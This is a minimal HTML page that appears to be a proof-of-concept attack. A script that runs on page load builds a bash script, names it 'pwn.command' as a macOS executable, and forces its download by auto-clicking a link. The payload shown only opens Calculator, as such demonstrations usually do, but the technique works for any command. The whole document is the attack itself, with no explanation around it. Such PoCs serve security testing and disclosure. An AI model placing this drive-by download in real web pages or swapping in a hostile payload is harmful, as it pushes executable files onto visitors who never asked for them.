<!DOCTYPE html>
<html>
<body>
  <script>
    const payload = `#!/bin/bash
open -a Calculator
`;
    const blob = new Blob([payload], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "pwn.command";  // macOS executable
    document.body.appendChild(a);
    a.click();
    a.remove();
  </script>
</body>
</html>
